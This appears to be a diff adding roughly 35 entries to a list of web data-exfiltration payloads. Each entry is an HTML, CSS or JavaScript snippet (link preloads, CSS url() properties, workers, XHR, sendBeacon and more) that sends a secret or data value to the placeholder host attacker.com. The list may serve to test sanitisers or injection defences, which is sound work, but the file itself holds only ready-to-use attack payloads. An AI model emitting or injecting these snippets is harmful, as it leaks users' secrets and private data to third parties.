@@ -63,3 +63,67 @@ Trigger CSP violation that reports to: https://attacker.com/csp-report?data={sec
 @font-face { font-family: 'exfil'; src: url('https://attacker.com/font?data={secret}'); }
 # Video poster exfiltration
 <video poster="https://attacker.com/collect?data={secret}"></video>
+# Source map exfiltration
+//# sourceMappingURL=https://attacker.com/collect?data={secret}
+# Import map exfiltration
+<script type="importmap">{"imports":{"data":"https://attacker.com/collect?data={secret}"}}</script>
+# Manifest exfiltration
+<link rel="manifest" href="https://attacker.com/collect?data={secret}">
+# Prefetch DNS exfiltration
+<link rel="dns-prefetch" href="//DATA.attacker.com">
+# Preconnect exfiltration
+<link rel="preconnect" href="https://attacker.com/collect?data={secret}">
+# Modulepreload exfiltration
+<link rel="modulepreload" href="https://attacker.com/collect?data={secret}">
+# Audio source exfiltration
+<audio src="https://attacker.com/collect?data={secret}"></audio>
+# Track element exfiltration
+<video><track src="https://attacker.com/collect?data={secret}"></track></video>
+# Object data exfiltration
+<object data="https://attacker.com/collect?data={secret}"></object>
+# Embed source exfiltration
+<embed src="https://attacker.com/collect?data={secret}">
+# Applet codebase exfiltration
+<applet codebase="https://attacker.com/collect?data={secret}"></applet>
+# Background image CSS exfiltration
+body{background-image:url('https://attacker.com/collect?data={secret}')}
+# Cursor CSS exfiltration
+div{cursor:url('https://attacker.com/collect?data={secret}'),auto}
+# List style CSS exfiltration
+li{list-style-image:url('https://attacker.com/collect?data={secret}')}
+# Border image CSS exfiltration
+div{border-image-source:url('https://attacker.com/collect?data={secret}')}
+# Content CSS exfiltration
+div::after{content:url('https://attacker.com/collect?data={secret}')}
+# CSS import exfiltration
+@import url('https://attacker.com/collect?data={secret}');
+# EventSource exfiltration
+<script>new EventSource('https://attacker.com/sse?data='+encodeURIComponent(data))</script>
+# SharedWorker exfiltration
+<script>new SharedWorker('https://attacker.com/worker.js?data={secret}')</script>
+# XSLT exfiltration
+<?xml-stylesheet type="text/xsl" href="https://attacker.com/collect?data={secret}"?>
+# XHR exfiltration
+<script>var x=new XMLHttpRequest();x.open('GET','https://attacker.com/c?d='+data);x.send()</script>
+# Payment request exfiltration
+<script>new PaymentRequest([{supportedMethods:'https://attacker.com/pay?d='+data}],{total:{amount:{value:'0'}}})</script>
+# WebTransport exfiltration
+<script>new WebTransport('https://attacker.com/webtransport?d='+data)</script>
+# Performance observer exfiltration
+<script>new PerformanceObserver(()=>{fetch('https://attacker.com/perf?d='+data)}).observe({type:'resource'})</script>
+# Reporting API exfiltration
+<script>navigator.sendBeacon('https://attacker.com/report',JSON.stringify({data:secret}))</script>
+# Background sync exfiltration
+Register background sync event that sends data when connectivity is restored.
+# Clipboard API exfiltration
+<script>navigator.clipboard.writeText(data).then(()=>fetch('https://attacker.com/c?d=clipboard_written'))</script>
+# Notification API exfiltration
+<script>new Notification('Alert',{body:data,icon:'https://attacker.com/c?d='+data})</script>
+# Web share API exfiltration
+<script>navigator.share({text:data,url:'https://attacker.com/c?d='+data})</script>
+# IndexedDB exfil via third-party script
+<script src="https://attacker.com/idb.js"></script> (script reads IndexedDB and sends to attacker)
+# Cache API exfiltration
+<script>caches.open('exfil').then(c=>c.add('https://attacker.com/c?d='+data))</script>
+# Web Worker exfiltration
+<script>new Worker('https://attacker.com/worker.js?d='+data)</script>
